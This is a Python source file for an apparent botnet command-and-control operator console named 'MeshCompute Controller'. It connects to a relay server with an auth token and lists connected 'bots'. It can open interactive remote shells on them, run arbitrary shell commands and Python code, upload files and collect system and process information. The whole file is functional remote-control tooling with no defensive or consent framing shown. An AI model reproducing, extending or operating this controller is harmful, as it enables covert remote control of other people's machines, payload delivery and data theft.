import asyncio
import json
import os
import base64
import logging
import websockets
from colorama import init, Fore, Style
from dotenv import load_dotenv
from common.config import SERVER_URL, AUTH_TOKEN

load_dotenv()
init(autoreset=True)
logging.basicConfig(level=logging.INFO)

INTRO = f"""{Fore.CYAN}

MeshCompute Controller

Befehle:
  list | shell <bot_id> | upload <bot_id> <file> [remote_name]
  exec <bot_id> <command> | sysinfo <bot_id> | ps <bot_id>
  ping <bot_id> | exit
{Style.RESET_ALL}"""

PROMPT = f"\n{Fore.GREEN}meshctrl > {Style.RESET_ALL}"

class MeshController:
    def __init__(self):
        self.ws = None
        self.connected = False
        self.task_counter = 0
        self.in_shell = False
        self.current_shell_task = None
        self.message_queue = asyncio.Queue()
        self.listener_task = None

    def next_task_id(self):
        self.task_counter += 1
        return f"ctrl_{self.task_counter}"

    async def connect(self):
        try:
            self.ws = await websockets.connect(
                SERVER_URL, ping_interval=20, ping_timeout=40
            )
            await self.ws.send(
                json.dumps({"type": "controller", "auth_token": AUTH_TOKEN})
            )
            self.connected = True
            self.listener_task = asyncio.create_task(self._listen())
            print(f"{Fore.GREEN}[+] Connected with relay server{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Connection failed: {e}{Style.RESET_ALL}")
            self.connected = False

    async def disconnect(self):
        self.connected = False
        if self.listener_task:
            self.listener_task.cancel()
        if self.ws:
            await self.ws.close()

    async def _listen(self):
        # Receives all messages and puts them in the queue.
        try:
            while self.connected:
                raw = await self.ws.recv()
                await self.message_queue.put(raw)
        except asyncio.CancelledError:
            pass
        except websockets.exceptions.ConnectionClosed:
            self.connected = False
        except Exception:
            self.connected = False

    async def _get_response(self, task_id: str, timeout=10):
        #Get a message with the appropriate task_id from the queue.
        try:
            while True:
                raw = await asyncio.wait_for(self.message_queue.get(), timeout=timeout)
                try:
                    data = json.loads(raw)
                except json.JSONDecodeError:
                    continue
                if data.get("task_id") == task_id:
                    return data
                # Messages without or with different task_id are ignored
                # (could be old shell outputs, for example)
        except asyncio.TimeoutError:
            return None

    async def send_command(self, command: dict):
        if not self.connected or not self.ws:
            print(f"{Fore.RED}Not connected.{Style.RESET_ALL}")
            return
        try:
            await self.ws.send(json.dumps(command))
            task_id = command.get("task_id")
            response = await self._get_response(task_id, timeout=25)
            if response:
                self._print_result(response)
            else:
                print(f"{Fore.RED}Timeout – no reply.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Fehler: {e}{Style.RESET_ALL}")
            self.connected = False

    def _print_result(self, data: dict):
        if data.get("type") == "shell_output":
            print(data.get("output", ""), end="", flush=True)
            return
        if data.get("type") == "shell_exit":
            print(f"\n{Fore.YELLOW}Shell has been terminated.{Style.RESET_ALL}")
            self.in_shell = False
            self.current_shell_task = None
            return
        if data.get("type") == "info":
            print(f"{Fore.CYAN}{data.get('message')}{Style.RESET_ALL}")
            return
        if data.get("type") == "file_upload_done":
            if data.get("error"):
                print(f"{Fore.RED}Upload failed: {data['error']}{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}Upload successfully{Style.RESET_ALL}")
            return

        # Normal results
        if "bots" in data.get("data", {}):
            bots = data["data"]["bots"]
            print(f"\n{Fore.CYAN}=== Connected Bots ({len(bots)}) ==={Style.RESET_ALL}")
            for bot in bots:
                print(f"  {Fore.GREEN}{bot.get('bot_id')}{Style.RESET_ALL}")
            return

        bot_id = data.get("bot_id", "Unknown")
        print(f"\n{Fore.YELLOW}=== Output of {bot_id} ==={Style.RESET_ALL}")
        if data.get("info"):
            for k, v in data["info"].items():
                if k != "bot_id":
                    print(f"  {k:12}: {v}")
        elif data.get("output"):
            print(data["output"].strip())
        elif data.get("message"):
            print(data["message"])
        else:
            print(json.dumps(data, indent=2, ensure_ascii=False))

    # ---- SHELL MODE ----
    async def shell_mode(self, bot_id: str, task_id: str):
        self.in_shell = True
        self.current_shell_task = task_id
        print(f"{Fore.YELLOW}=== Interactive Shell @ {bot_id} (exit zum verlassen) ==={Style.RESET_ALL}")
        try:
            while self.in_shell:
                cmd = await asyncio.get_event_loop().run_in_executor(
                    None, input, f"shell@{bot_id.split('-')[0]}> "
                )
                if not cmd.strip():
                    continue
                if cmd.lower() in ["exit", "quit"]:
                    await self.ws.send(json.dumps({
                        "type": "shell_input",
                        "command": "exit",
                        "task_id": task_id
                    }))
                    # Wait to shell_exit
                    exit_resp = await self._get_response(task_id, timeout=5)
                    if exit_resp:
                        self._print_result(exit_resp)
                    break
                await self.ws.send(json.dumps({
                    "type": "shell_input",
                    "command": cmd,
                    "task_id": task_id
                }))
                # Collect response(s)
                while True:
                    resp = await self._get_response(task_id, timeout=10)
                    if resp is None:
                        break
                    if resp.get("type") == "shell_output":
                        print(resp.get("output", ""), end="", flush=True)
                        # Continue to wait for possible further outputs (do not cancel)
                        continue
                    elif resp.get("type") == "shell_exit":
                        self._print_result(resp)
                        return
                    else:
                        # Unexpected Type -> Exit
                        break
        except Exception:
            pass
        finally:
            self.in_shell = False
            self.current_shell_task = None

    # ---- COMMAND PROCESSING ----
    async def handle_command(self, line: str):
        line = line.strip()
        if not line:
            return
        parts = line.split()
        cmd = parts[0].lower()

        if cmd == "shell":
            if len(parts) < 2:
                print("Verwendung: shell <bot_id>")
                return
            target = parts[1]
            task_id = self.next_task_id()
            # Start Shell on the Bot
            await self.send_command({
                "type": "command",
                "action": "shell",
                "target": target,
                "task_id": task_id
            })
            # Wait a moment, then boot into shell mode
            await asyncio.sleep(0.3)
            await self.shell_mode(target, task_id)
            return

        if cmd == "list":
            await self.send_command({"type": "command", "action": "list", "task_id": self.next_task_id()})
        elif cmd == "upload":
            if len(parts) < 3:
                print("Usage: upload <bot_id> <file> [remote_name]")
                return
            target = parts[1]
            local_path = parts[2]
            remote_name = parts[3] if len(parts) > 3 else None
            await self.upload_file(target, local_path, remote_name)
        elif cmd == "exec":
            if len(parts) < 3:
                print("Usage: exec <bot_id> <command>")
                return
            target = parts[1]
            payload = " ".join(parts[2:])
            await self.send_command({
                "type": "command",
                "action": "exec",
                "target": target,
                "payload": payload,
                "task_id": self.next_task_id()
            })
        elif cmd in ("sysinfo", "ps", "ping"):
            target = parts[1] if len(parts) > 1 else "all"
            await self.send_command({
                "type": "command",
                "action": cmd,
                "target": target,
                "task_id": self.next_task_id()
            })
        elif cmd == "python":
            if len(parts) < 3:
                print("Usage: python <bot_id> `<code>`")
                return
            target = parts[1]
            payload = " ".join(parts[2:])
            await self.send_command({
                "type": "command",
                "action": "python",
                "target": target,
                "payload": payload,
                "task_id": self.next_task_id()
            })
        elif cmd in ("exit", "quit"):
            print(f"{Fore.YELLOW}Exiting Controller...{Style.RESET_ALL}")
            await self.disconnect()
            raise SystemExit
        elif cmd in ("clear", "cls"):
            os.system('cls' if os.name == 'nt' else 'clear')
        elif cmd == "help":
            print(INTRO)
        else:
            print(f"{Fore.RED}Unknown command. Type 'help'.{Style.RESET_ALL}")

    async def upload_file(self, target: str, local_path: str, remote_name: str = None):
        if not os.path.exists(local_path):
            print(f"{Fore.RED}File not found.{Style.RESET_ALL}")
            return
        try:
            with open(local_path, "rb") as f:
                data = f.read()
            content_b64 = base64.b64encode(data).decode('utf-8')
            filename = remote_name or os.path.basename(local_path)
            task_id = self.next_task_id()
            await self.ws.send(json.dumps({
                "type": "command",
                "action": "upload",
                "target": target,
                "filename": filename,
                "content": content_b64,
                "task_id": task_id
            }))
            print(f"{Fore.CYAN}Upload started...{Style.RESET_ALL}")
            # Waiting for confirmation
            resp = await self._get_response(task_id, timeout=20)
            if resp:
                self._print_result(resp)
            else:
                print(f"{Fore.RED}No upload confirmation received.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Upload Error: {e}{Style.RESET_ALL}")


async def main():
    print(INTRO)
    ctrl = MeshController()
    await ctrl.connect()
    if not ctrl.connected:
        return
    try:
        while True:
            user_input = await asyncio.get_event_loop().run_in_executor(None, input, PROMPT)
            await ctrl.handle_command(user_input)
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        await ctrl.disconnect()


if __name__ == "__main__":
    asyncio.run(main())